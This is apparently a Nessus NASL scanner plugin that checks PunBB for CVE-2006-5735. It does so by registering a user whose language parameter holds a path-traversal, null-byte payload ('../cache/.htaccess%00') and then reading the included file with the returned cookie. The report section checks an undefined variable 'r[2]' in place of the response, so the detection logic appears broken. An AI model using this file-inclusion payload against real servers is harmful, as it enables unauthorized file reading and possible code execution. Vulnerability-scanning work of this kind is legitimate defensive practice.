#%NASL_MIN_LEVEL 70300
#	
#	This script was written by Justin Seitz	<jms@bughunter.ca>
#	Per Justin : GPLv2
#

# Changes by Tenable:
# - Revised plugin title (9/6/11)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(22932);
  script_version("1.24");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/06/01");

  script_cve_id("CVE-2006-5735");
  script_bugtraq_id(20786);

  script_name(english:"PunBB include/common.php language Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue.");
  script_set_attribute(attribute:"description", value:
"The version of PunBB installed on the remote host fails to sanitize
input to the 'language' parameter before storing it in the
'register.php' script as a user's preferred language setting.  By
registering with a specially crafted value, an attacker can leverage
this issue to view arbitrary files and possibly execute arbitrary code
on the affected host.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/450055/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://forums.punbb.org/viewtopic.php?id=13496");
  script_set_attribute(attribute:"solution", value:
"Update to version 1.2.14 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/10/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/11/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 Justin Seitz");

  script_dependencies("punBB_detect.nasl", "smtp_settings.nasl");
  script_require_keys("www/punBB");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded:TRUE);

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

# Determine if there is a version of PunBB installed.

install = get_kb_item("www/" + port + "/punBB");
if (isnull(install)) exit(0);
matches = pregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (isnull(matches)) exit(0);

dir = matches[2];
domain = get_kb_item('Settings/third_party_domain');
if (!domain) domain = 'example.com';

# Begin by posting a registration request with a language 
# parameter set to our local file we want to include.
# We use the following for username/password in an attempt to be unique:
file = "../cache/.htaccess";
username = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
password = unixtime();
email = username + "@" + domain;
url = "form_sent=1&req_username=" +  username +
      "&req_password1=" +  password +
      "&req_password2=" +  password +
      "&req_email1=" +  email +
      "&timezone=0&language=" +  file +
      "%00&email_setting=1&save_pass=1";
registeruser = http_post(port:port,item:dir + "/register.php",data:url);
registeruser = ereg_replace(string:registeruser, pattern:"Content-Length: ", replace: "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ");
reg_response = http_keepalive_send_recv(port:port, data: registeruser, bodyonly:FALSE);
if(isnull(reg_response) || "punbb_cookie=" >!< reg_response) exit(0);

# Let's grab the cookie sent back with the poisoned language variable and use it to authenticate and check the local file include.
punbb_cookie = egrep(pattern:"Set-Cookie: punbb_cookie=[a-zA-Z0-9%]*", string:reg_response);
if("expires" >< punbb_cookie) {
	punbb_cookie = punbb_cookie - strstr(punbb_cookie,"expires");
	punbb_cookie = ereg_replace(string:punbb_cookie,pattern:"Set-Cookie",replace:"Cookie");
}
if(isnull(punbb_cookie)) exit(0);
 
# Now verify that we can read the contents of the file.

attackreq = http_get(item:dir + "/index.php",port:port);
attackreq = ereg_replace(string:attackreq,pattern:"Accept:",replace:punbb_cookie,"\r\nAccept:");
attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
if(isnull(attackres)) exit(0);

# Report output for plugin

htaccess = "";

if ("<Limit GET POST PUT>" >< r[2])
{
  htaccess = r[2];
  if("There is no valid language pack" >< htaccess)
   htaccess = htaccess - strstr(htaccess,"There is no valid language pack");
}

if (htaccess)
{
 if(dir == "") dir = "/";
 info = "The version of PunBB installed in directory '" + dir + "'" +
        '\n' + "is vulnerable to this issue. Here is the contents of 'cache/.htaccess'" +
        '\nfrom the remote host : \n\n' + data_protection::sanitize_user_full_redaction(output:htaccess);

 security_report_v4(port:port, extra:info, severity:SECURITY_HOLE);
}

